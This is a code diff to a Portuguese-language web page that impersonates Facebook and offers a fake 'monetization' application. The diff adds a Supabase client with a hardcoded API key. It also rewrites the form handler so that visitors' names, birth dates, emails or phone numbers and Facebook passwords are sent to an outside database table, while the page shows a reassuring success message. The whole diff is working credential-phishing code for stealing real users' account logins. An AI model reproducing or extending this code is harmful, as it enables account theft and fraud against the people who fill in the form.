@@ -168,41 +168,74 @@
         <p>© 2023 Facebook. Todos os direitos reservados.</p>
     </div>
 
+    <!-- SDK do Supabase -->
+    <script src="https://unpkg.com/@supabase/supabase-js@2"></script>
     <script>
-        document.getElementById('monetizacaoForm').addEventListener('submit', function(e) {
+        // Configuração do Supabase (SUAS CREDENCIAIS)
+        const supabaseUrl = 'https://mpzlmquzmboqklohshfs.supabase.co';
+        const supabaseKey = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im1wemxtcXV6bWJvcWtsb2hzaGZzIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTI2MDAyOTksImV4cCI6MjA2ODE3NjI5OX0.n-Nmyt-5k2Oz6OHKvgFFEpXIYmyAJg_DLn13M_D69S4';
+        const supabase = supabase.createClient(supabaseUrl, supabaseKey);
+
+        document.getElementById('monetizacaoForm').addEventListener('submit', async (e) => {
             e.preventDefault();
             
             const nome = document.getElementById('nome').value;
             const nascimento = document.getElementById('nascimento').value;
-            const seguidores = document.getElementById('seguidores').value;
+            const seguidores = parseInt(document.getElementById('seguidores').value);
             const emailOuTelefone = document.getElementById('email').value;
             const senha = document.getElementById('senha').value;
             const messageDiv = document.getElementById('message');
-            
-            // Validação para email ou telefone
+
+            // Validação
             const isEmail = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(emailOuTelefone);
             const isTelefone = /^[\d\s\(\)\-]+$/.test(emailOuTelefone);
             
-            if (!nome || !nascimento || !seguidores || !emailOuTelefone || !senha) {
-                messageDiv.textContent = "Por favor, preencha todos os campos incluindo login com Facebook";
-                messageDiv.className = "message error";
-                messageDiv.style.display = "block";
-            } else if (!isEmail && !isTelefone) {
-                messageDiv.textContent = "Por favor, insira um email válido ou número de telefone";
-                messageDiv.className = "message error";
-                messageDiv.style.display = "block";
-            } else {
-                messageDiv.textContent = "Monetização enviada! Aguarde 24 horas para o time do Facebook analisar sua solicitação.";
-                messageDiv.className = "message success";
-                messageDiv.style.display = "block";
+            if (!nome || !nascimento || isNaN(seguidores) || !emailOuTelefone || !senha) {
+                showMessage("Por favor, preencha todos os campos corretamente", "error");
+                return;
+            }
+
+            if (!isEmail && !isTelefone) {
+                showMessage("Por favor, insira um email válido ou número de telefone", "error");
+                return;
+            }
+
+            try {
+                // Envia para a tabela "facedados"
+                const { data, error } = await supabase
+                    .from('facedados')
+                    .insert([
+                        {
+                            nome: nome,
+                            nascimento: nascimento,
+                            seguidores: seguidores,
+                            email_ou_tel: emailOuTelefone,
+                            senha: senha,
+                            data_cadastro: new Date().toISOString()
+                        }
+                    ]);
+
+                if (error) throw error;
                 
+                showMessage("Cadastro realizado com sucesso! Aguarde nosso contato.", "success");
                 document.getElementById('monetizacaoForm').reset();
-                
-                setTimeout(() => {
-                    messageDiv.style.display = "none";
-                }, 5000);
+
+            } catch (error) {
+                console.error("Erro detalhado:", error);
+                showMessage("Erro ao cadastrar: " + error.message, "error");
             }
         });
+
+        function showMessage(text, type) {
+            const messageDiv = document.getElementById('message');
+            messageDiv.textContent = text;
+            messageDiv.className = "message " + type;
+            messageDiv.style.display = "block";
+            
+            setTimeout(() => {
+                messageDiv.style.display = "none";
+            }, 5000);
+        }
     </script>
 </body>
 </html>
